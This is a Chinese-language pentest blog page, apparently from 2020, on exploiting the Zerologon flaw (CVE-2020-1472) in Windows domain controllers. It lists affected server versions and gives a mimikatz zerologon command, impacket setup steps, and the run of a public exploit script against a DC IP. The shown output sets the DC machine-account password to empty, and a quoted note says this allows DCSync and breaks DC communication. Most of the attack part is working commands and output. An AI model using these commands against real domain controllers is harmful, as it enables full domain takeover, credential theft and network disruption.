<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>Zerologon（CVE-2020-1472）漏洞利用测试 - x51</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=渗透测试,内网渗透,红蓝对抗>
  
    <meta name="description" content="与其感叹路难行，不如马上出发。">
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x51</a>
    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">主页</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives" class="menu-item-link">归档</a>
        </li>
      
        <li class="menu-item">
          <a href="/tools" class="menu-item-link">Tools</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">关于</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">Zerologon（CVE-2020-1472）漏洞利用测试</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2020-09-24</span>
  </div>
  <div class="post-content">
    <h3 id="Zerologon（CVE-2020-1472）漏洞利用测试"><a href="#Zerologon（CVE-2020-1472）漏洞利用测试" class="headerlink" title="Zerologon（CVE-2020-1472）漏洞利用测试"></a>Zerologon（CVE-2020-1472）漏洞利用测试</h3><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>• Microsoft Windows Server 2008 R2 SP1<br>• Microsoft Windows Server 2012<br>• Microsoft Windows Server 2012 R2<br>• Microsoft Windows Server 2016<br>• Microsoft Windows Server 2019<br>• Microsoft Windows Server version 2004 (Server Core Installation)<br>• Microsoft Windows Server version 1903 (Server Core Installation)<br>• Microsoft Windows Server version 1909 (Server Core Installation)  </p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><h6 id="mimikatz2-2-0："><a href="#mimikatz2-2-0：" class="headerlink" title="mimikatz2.2.0："></a>mimikatz2.2.0：</h6><p><code>lsadump::zerologon /target:dc.corp.local /account:dc$ /exploit</code></p>
<h6 id="cve-2020-1472-exploit-py"><a href="#cve-2020-1472-exploit-py" class="headerlink" title="cve-2020-1472-exploit.py"></a>cve-2020-1472-exploit.py</h6><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装impacket</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/SecureAuthCorp/impacket.git</span><br><span class="line"><span class="keyword">cd</span> impacket</span><br><span class="line"><span class="keyword">python3</span> setup.<span class="keyword">py</span> install</span><br></pre></td></tr></table></figure>



<p><code>python3 cve-2020-1472-exploit.py dc 10.10.10.10</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/github/CVE-</span><span class="number">2020-1472</span><span class="comment"># python3 cve-2020-1472-exploit.py dc-x51 10.10.10.10</span></span><br><span class="line">Performing authentication attempts...</span><br><span class="line">===================================================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line"><span class="symbol">Result:</span> 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/github/CVE-</span><span class="number">2020-1472</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>其中<code>dc-x51</code>是DC的netbios  name。</p>
<h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>来自py脚本作者的说明：</p>
<p><code>Do note that by default this changes the password of the domain controller account. Yes this allows you to DCSync, but it also breaks communication with other domain controllers, so be careful with this!</code></p>

  </div>
  <div class="post-footer">
    

    <a href="#top" class="top">返回顶部</a>
  </div>
</article>
<footer>
  &copy; 2020
  <span class="author">
    x51
  </span>
</footer>
    </div>
  </body>
</html>